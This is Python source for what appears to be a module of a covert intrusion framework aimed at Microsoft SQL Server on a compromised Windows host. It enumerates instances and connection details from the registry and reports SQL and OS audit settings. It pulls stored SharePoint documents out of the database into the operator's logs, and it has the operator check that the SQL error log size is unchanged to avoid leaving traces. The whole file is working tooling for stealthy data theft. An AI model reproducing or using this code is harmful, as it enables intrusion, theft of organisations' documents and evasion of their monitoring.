
import os
from string import Template
from datetime import timedelta
import dsz
import dsz.windows
import dsz.lp
import ops.menu
from ops.pprint import pprint
from ops.system.registry import get_registrykey
from ops.files.dirs import get_dirlisting
import sql_utils
import sql_xml_parser
from generic import GenericDatabase
UNSET = '<Unset>'
DRIVER = 'Driver'
INSTANCE = 'Instance'
DATABASE = 'Database'
DB_FILE = 'Database File (mdf)'
TRUSTED_CONNECTION = 'Trusted_Connection'

class SQLServer(GenericDatabase, ):
    NAME = 'SQL Server'

    def __init__(self):
        GenericDatabase.__init__(self)
        self.working_instance = None
        self.instance_version = None
        self.ver8 = None
        self.instance_registry_location = None
        self.sql_directory = None
        self.available_databases = []
        self.working_instance_is_32_on_64 = False

    def store_sql_server_settings(self):
        print ''
        dsz.ui.Echo('Identifying working instances...', dsz.GOOD)
        instance_list = identify_working_instance()
        wow32_list = []
        if dsz.version.checks.IsOs64Bit():
            wow32_list = identify_working_instance(wow32=True)
            instance_list += wow32_list
        if (len(instance_list) > 1):
            self.working_instance = choose_instance(instance_list)
        else:
            self.working_instance = instance_list[0]
        if (self.working_instance in wow32_list):
            print '\nUsing a 32-bit instance on a 64-bit platform!\n'
            self.working_instance_is_32_on_64 = True
        if (not self.working_instance):
            dsz.ui.Echo("Couldn't find any SQL Server Instances. Exiting.", dsz.ERROR)
            return False
        self.instance_version = get_current_version(self.working_instance, self.working_instance_is_32_on_64)
        if (not self.instance_version):
            dsz.ui.Echo("Couldn't get instance version. Exiting.", dsz.ERROR)
            return False
        self.ver8 = self.instance_version.startswith('8.00')
        self.instance_registry_location = get_instance_registry_location(self.working_instance, self.ver8, self.working_instance_is_32_on_64)
        if (not self.instance_registry_location):
            dsz.ui.Echo("Couldn't get instance registry location. Exiting.", dsz.ERROR)
            return False
        self.sql_directory = get_sql_program_dir(self.instance_registry_location, self.working_instance_is_32_on_64)
        if (not self.sql_directory):
            dsz.ui.Echo("Couldn't get SQL directory from instance registry location. Exiting.", dsz.ERROR)
            return False
        return True

    def audit_check(self):
        dsz.control.echo.Off()
        if ((not self.working_instance) and (not self.store_sql_server_settings())):
            print ''
            dsz.ui.Echo('Audit check failed! Proceed with caution!', dsz.ERROR)
            return False
        version_string = get_full_version_string(self.instance_version, self.instance_registry_location, self.ver8, self.working_instance_is_32_on_64)
        instance_audit_level = get_audit_level(self.instance_registry_location, self.working_instance_is_32_on_64)
        instance_login_mode = get_login_mode(self.instance_registry_location, self.working_instance_is_32_on_64)
        print 'Current SQL Server Parameters:'
        print ('\t Active SQL Server instance: ' + self.working_instance)
        print ('\t Instance version: ' + version_string)
        print ('\t Instance audit level: ' + instance_audit_level)
        print ('\t Instance login mode: ' + instance_login_mode)
        print ('\t Base directory: ' + self.sql_directory)
        show_enabled_protocols(self.instance_registry_location, self.ver8, self.working_instance_is_32_on_64)
        show_error_log_info(self.sql_directory)
        try:
            os_auditing = dsz.env.Get('OPS_AUDITOFF')
            if (os_auditing == 'TRUE'):
                print "\t OS auditing is off (not sure if it's just Security Log or all auditing though)"
            else:
                print '\t OS auditing is on'
        except EnvironmentError as details:
            if (details[0].find('Failed to get env value') != (-1)):
                print "\t couldn't determine OS auditing status"
        print ''
        dsz.control.echo.On()

    def connection_string_wizard(self):
        print ''
        if (not self.working_instance):
            self.store_sql_server_settings()
        if (not self.available_databases):
            self.available_databases = get_database_file_list()
            if (not self.available_databases):
                print ''
                dsz.ui.Echo("Didn't get list of databases from file system.\n", dsz.WARNING)
        menu = ops.menu.Menu()
        heading = 'Change the options below to configure your connection string.\n\nDriver and Instance are required.\n\nEverything else is optional and should be changed if you have trouble connecting. \n\nInstance should be prepended with .\\ unless using the named pipe. Sharepoint servers almost always use .\\localhost as the Instance value.'
        menu.set_heading(heading)
        menu.add_str_option(INSTANCE, state=('.\\%s' % self.working_instance))
        menu.add_option(DRIVER, state=UNSET, callback=sql_utils.select_driver_menu, menu=menu)
        menu.add_str_option(TRUSTED_CONNECTION, state='Yes', default='Yes')
        menu.add_option(DATABASE, '', callback=select_database_menu, available_databases=self.available_databases, menu=menu)
        menu.add_str_option(DB_FILE, '')
        while True:
            result = menu.execute(exit='Connect...')
            state = result['all_states']['']
            if (not any([value for value in state.values() if (value == UNSET)])):
                break
            else:
                print ''
                dsz.ui.Echo('You must set all required values!', dsz.ERROR)
        con_string = ('Driver={%s};Server={%s}' % (state[DRIVER], state[INSTANCE]))
        if state.has_key(DATABASE):
            con_string += (';Database={%s}' % state[DATABASE])
        if state.has_key(DB_FILE):
            con_string += (';AttachDbFilename={%s}' % state[DB_FILE])
        if (state.has_key(TRUSTED_CONNECTION) and (state[TRUSTED_CONNECTION].lower() == 'yes')):
            con_string += (';Trusted_Connection={%s}' % state[TRUSTED_CONNECTION])
        return con_string

    def top_ten_query(self, handle_id):
        table_file = os.path.join(os.path.dirname(__file__), '..', '..', 'Data', 'database_plans', 'SQL Server', 'Survey (Ver 9+)', 'tables.sql')
        top_ten_query = 'select top 10 * from %s'
        GenericDatabase.top_ten_query(self, handle_id, table_file, top_ten_query)

    def canned_plan_menu(self, handle_id):
        menu = ops.menu.Menu()
        menu.set_heading('SQL Server Canned Query Plans')
        plan_path = os.path.join(os.path.dirname(__file__), '..', '..', 'Data', 'database_plans', 'SQL Server')
        plan_path = os.path.normpath(plan_path)
        for folder in os.listdir(plan_path):
            query_folder = os.path.join(plan_path, folder)
            if (not os.path.isdir(query_folder)):
                continue
            menu.add_option(folder, callback=sql_utils.run_folder_of_queries, handle_id=handle_id, query_folder=query_folder, csv_output=self.csv_output, max_col_size=self.max_col_size)
        menu.add_option('Sharepoint', callback=self.sharepoint_queries, handle_id=handle_id)
        menu.execute(exit='Back')

    def sharepoint_queries(self, handle_id):
        print ''
        inputs = {}
        inputs['START_DATE'] = dsz.ui.GetString('Enter the start date of your search (YYYY-MM-DD):')
        inputs['END_DATE'] = dsz.ui.GetString('Enter the end date of your search (YYYY-MM-DD):')
        base_query_dir = os.path.join(os.path.dirname(__file__), '..', '..', 'Data', 'database_plans', 'SQL Server')
        file_list_query = os.path.join(base_query_dir, 'Sharepoint File List.sql')
        (status, list_id) = sql_utils.run_query_from_file(handle_id, file_list_query, echo=True, mapping=inputs)
        if (not status):
            print ''
            dsz.ui.Echo("Couldn't get the current file list, try reconnecting.", dsz.ERROR)
            return None
        header = sql_xml_parser.header_from_id(list_id)
        data = [row for row in sql_xml_parser.data_from_id(list_id)]
        print_data_with_rownums(data, header)
        to_get = prompt_for_items('Would you like to pull any of the above files?')
        if (not to_get):
            return None
        input_handle = open(os.path.join(base_query_dir, 'Sharepoint Content Query.sql'), 'rb')
        content_query = Template(input_handle.read().strip())
        input_handle.close()
        output_dir = os.path.join(dsz.lp.GetLogsDirectory(), 'GetFiles', 'Sharepoint_Decrypted')
        for number in to_get:
            row_data = dict(zip(header, data[(int(number) - 1)]))
            query = content_query.safe_substitute(row_data)
            (status, content_id) = sql_utils.run_query(handle_id, query, echo=True, max_col_size=self.max_col_size)
            if (not status):
                print ''
                dsz.ui.Echo(('Error getting file #%s\n' % number), dsz.ERROR)
                continue
            output_path = os.path.join(output_dir, ('%s-%s' % (content_id, row_data['LeafName'])))
            sql_xml_parser.save_blob_from_file(content_id, output_path, column_index=0)

    def cleanup(self, handle_id):
        GenericDatabase.cleanup(self, handle_id)
        print ''
        dsz.ui.Echo("Check the size of the file below to ensure it hasn't changed:", dsz.GOOD)
        dsz.control.echo.Off()
        if (not self.sql_directory):
            self.store_sql_server_settings()
        show_error_log_info(self.sql_directory)
        dsz.control.echo.On()

def safe_reg_value(hive, path, key, verbose=True, wow32=False):
    try:
        cache_tag = ('%s\\%s\\%s\\%s' % (hive, path, key, (32 if wow32 else 64)))
        values = get_registrykey(hive, path, value=key, wow32=wow32, cache_tag=cache_tag, maxage=timedelta(days=1))
        final_values = []
        for value in values.key[0].value:
            value_text = value.value
            if (value.type == u'REG_MULTI_SZ'):
                value_text = value_text.decode('hex').decode('utf-16-le')
            value_text = value_text.encode('ascii').replace('\x00', '')
            final_values.append(value_text)
    except ops.cmd.OpsCommandException as e:
        if verbose:
            dsz.ui.Echo(e.message, dsz.ERROR)
        return None
    return final_values

def identify_working_instance(wow32=False):
    instances = safe_reg_value('L', 'SOFTWARE\\Microsoft\\Microsoft SQL Server', 'InstalledInstances', wow32=wow32)
    if (not instances):
        return []
    instance_list = [entry for entry in instances]
    return instance_list

def choose_instance(instance_list):
    instance_menu = ops.menu.Menu()
    heading = 'There are multiple SQL Server instances on this server.\nChoose the instance you want to query:'
    instance_menu.set_heading(heading)
    for item in instance_list:
        instance_menu.add_option(item)
    result = instance_menu.execute(exit='Back', menuloop=False)
    choice = result['option']
    if (choice == 'Back'):
        choice = None
    return choice

def get_current_version(working_instance, wow32):
    path = (('SOFTWARE\\Microsoft\\Microsoft SQL Server\\' + working_instance) + '\\MSSQLServer\\CurrentVersion')
    current_version = safe_reg_value('L', path, 'CurrentVersion', False, wow32=wow32)
    if current_version:
        return current_version[0]
    path = (('SOFTWARE\\Microsoft\\MSSQLServer\\' + working_instance) + '\\CurrentVersion')
    current_version = safe_reg_value('L', path, 'CurrentVersion', False, wow32=wow32)
    if current_version:
        return current_version[0]
    return None

def get_instance_registry_location(working_instance, ver8, wow32):
    if (ver8 and (working_instance == 'MSSQLSERVER')):
        return 'SOFTWARE\\Microsoft\\MSSQLServer\\'
    elif ver8:
        return ('SOFTWARE\\Microsoft\\Microsoft SQL Server\\' + working_instance)
    path = 'SOFTWARE\\Microsoft\\Microsoft SQL Server\\Instance Names\\SQL'
    instance_id = safe_reg_value('L', path, working_instance, wow32=wow32)
    if (not instance_id):
        return None
    return ('SOFTWARE\\Microsoft\\Microsoft SQL Server\\' + instance_id[0])

def get_full_version_string(current_version, instance_reg_loc, ver8, wow32):
    if ver8:
        return (current_version + ' - SQL Server 2000 ')
    edition_path = (instance_reg_loc + '\\Setup')
    edition = safe_reg_value('L', edition_path, 'Edition', wow32=wow32)
    if current_version.startswith('10.0'):
        return ((current_version + ' - SQL Server 2008 ') + edition[0])
    elif current_version.startswith('9.00'):
        return ((current_version + ' - SQL Server 2005 ') + edition[0])
    else:
        return 'Unknown SQL Server Version'

def get_audit_level(instance_reg_loc, wow32):
    audit_path = (instance_reg_loc + '\\MSSQLServer')
    audit_level = safe_reg_value('L', audit_path, 'AuditLevel', wow32=wow32)
    audit_level = int(audit_level[0])
    audit_map = {0: 'no auditing', 1: 'successful logins', 2: 'failed logins', 3: 'successful and failed logins'}
    return ('%s - %s' % (audit_level, audit_map[audit_level]))

def get_login_mode(instance_reg_loc, wow32):
    login_mode_path = (instance_reg_loc + '\\MSSQLServer')
    login_mode = safe_reg_value('L', login_mode_path, 'LoginMode', wow32=wow32)
    login_mode = int(login_mode[0])
    login_map = {0: 'mixed mode', 1: 'integrated mode', 2: 'mixed mode'}
    return ('%s - %s' % (login_mode, login_map[login_mode]))

def get_sql_program_dir(instance_reg_loc, wow32):
    prog_dir_path = (instance_reg_loc + '\\Setup')
    prog_dir = safe_reg_value('L', prog_dir_path, 'SqlProgramDir', wow32=wow32)
    if (prog_dir is None):
        prog_dir = safe_reg_value('L', prog_dir_path, 'SQLPath', wow32=wow32)
    root_sql_dir = prog_dir[0][0:prog_dir[0].rfind('\\')]
    return root_sql_dir

def get_named_pipe(instance_reg_loc, wow32):
    np_path = ('%s\\MSSQLServer\\SuperSocketNetLib\\Np' % instance_reg_loc)
    named_pipe = safe_reg_value('L', np_path, 'PipeName', wow32=wow32)
    return named_pipe[0]

def get_tcp_port(instance_reg_loc, wow32):
    tcp_key = ('%s\\MSSQLServer\\SuperSocketNetLib\\Tcp\\IPALL' % instance_reg_loc)
    port = safe_reg_value('L', tcp_key, 'TcpPort', verbose=False, wow32=wow32)
    if port:
        return port[0]
    tcp_key = ('%s\\MSSQLServer\\SuperSocketNetLib\\Tcp' % instance_reg_loc)
    port = safe_reg_value('L', tcp_key, 'TcpPort', verbose=False, wow32=wow32)
    if port:
        return port[0]
    return None

def show_enabled_protocols(instance_reg_loc, ver8, wow32):
    tcp_enabled = False
    np_enabled = False
    if ver8:
        proto_path = ('%s\\MSSQLServer\\SuperSocketNetLib' % instance_reg_loc)
        protos = safe_reg_value('L', proto_path, 'ProtocolList', wow32=wow32)
        for item in protos:
            if (item == 'tcp'):
                tcp_enabled = True
            elif (item == 'np'):
                np_enabled = True
    else:
        np_path = (instance_reg_loc + '\\MSSQLServer\\SuperSocketNetLib\\Np')
        np_value = safe_reg_value('L', np_path, 'Enabled', wow32=wow32)
        if (np_value[0] == '1'):
            np_enabled = True
        tcp_path = (instance_reg_loc + '\\MSSQLServer\\SuperSocketNetLib\\Tcp')
        tcp_value = safe_reg_value('L', tcp_path, 'Enabled', wow32=wow32)
        if (tcp_value[0] == '1'):
            tcp_enabled = True
    if tcp_enabled:
        port = get_tcp_port(instance_reg_loc, wow32=wow32)
        if (port == ''):
            port = '<UNSPECIFIED>'
        print ('\t TCP/IP is enabled - port: %s' % port)
    else:
        print '\t TCP/IP is not enabled according to the Registry. Try a netstat to confirm.'
    status = ('is' if np_enabled else 'is NOT')
    print ('\t NamedPipe %s enabled - NamedPipe location: %s' % (status, get_named_pipe(instance_reg_loc, wow32=wow32)))

def show_error_log_info(sql_directory):
    dsz.cmd.Run(('dir -mask ERRORLOG -path "%s" -recursive -max 0' % sql_directory), dsz.RUN_FLAG_RECORD)
    try:
        error_log_path = dsz.cmd.data.Get('diritem::path', dsz.TYPE_STRING)
        size = dsz.cmd.data.Get('diritem::fileitem[0]::size', dsz.TYPE_INT)
        modified = dsz.cmd.data.Get('diritem::fileitem[0]::filetimes::modified::time', dsz.TYPE_STRING)[0]
    except RuntimeError:
        dsz.ui.Echo('\t Exception locating error log path!', dsz.ERROR)
        return (None, None)
    if (not error_log_path[0]):
        print "\t Couldn't find error log path!"
    else:
        print ('\t Log Path: %s - %s bytes - Modified: %s' % ((error_log_path[0] + '\\ERRORLOG'), size[0], modified))

def select_database_menu(available_databases, menu):
    print ''
    if (not available_databases):
        dsz.ui.Echo('No list of available databases found.\n', dsz.WARNING)
        db_name = dsz.ui.GetString('Please enter the name of the database')
        menu.set_current_state(db_name)
        return
    dsz.ui.Echo('Available Databases', dsz.GOOD)
    for (i, row) in enumerate(available_databases):
        row['Row'] = (i + 1)
    pprint(available_databases, dictorder=['Row', 'Name', 'Size', 'Modified', 'Path'])
    to_get = (-1)
    while ((to_get < 0) or (to_get >= len(available_databases))):
        print ''
        to_get = dsz.ui.GetInt('Type a number to select a database')
        to_get = (to_get - 1)
    menu.set_current_state(available_databases[to_get]['Name'])

def get_database_file_list():
    dsz.control.echo.Off()
    dsz.ui.Echo("Would you like to run a full dir for *.mdf files? The connection string wizard uses this to find all available database names. \n\nIf you say no, you will have to type the database name by hand. \n\nIf you've run this already in the last day, you should say YES because the script will read the file list from the previously cached values.", dsz.GOOD)
    print ''
    should_dir = dsz.ui.Prompt('Run: dir -path * -mask *.mdf -recursive?')
    if (should_dir == False):
        dsz.control.echo.On()
        return []
    path = '*'
    mask = '*.mdf'
    cache_tag = ('%s//%s' % (path, mask))
    try:
        dir_list = get_dirlisting(path, mask=mask, recursive=True, cache_tag=cache_tag, maxage=timedelta(days=1))
    except ops.cmd.OpsCommandException as e:
        dsz.control.echo.On()
        return []
    items = []
    for dir_item in dir_list.diritem:
        for file_item in dir_item.fileitem:
            name = os.path.splitext(file_item.name)[0]
            item = {'Name': name, 'Size': file_item.size, 'Modified': file_item.filetimes.modified.time, 'Path': file_item.fullpath}
            items.append(item)
    dsz.control.echo.On()
    return items

def print_data_with_rownums(data, header):
    for (i, row) in enumerate(data):
        row.insert(0, (i + 1))
    header.insert(0, '#')
    pprint(data, header)

def prompt_for_items(prompt):
    print ''
    to_get = []
    if (not dsz.ui.Prompt(prompt)):
        return []
    items = raw_input('Enter your selection (1, 2, 3-5,7,8-10)')
    items = items.replace(' ', '')
    selection = items.split(',')
    for i in selection:
        num = i.strip().split('-')
        if (len(num) > 1):
            num_range = range(int(num[0]), (int(num[1]) + 1))
            for j in num_range:
                to_get.append(j)
        else:
            to_get.append(int(num[0]))
    to_get = list(set(to_get))
    to_get.sort()
    return to_get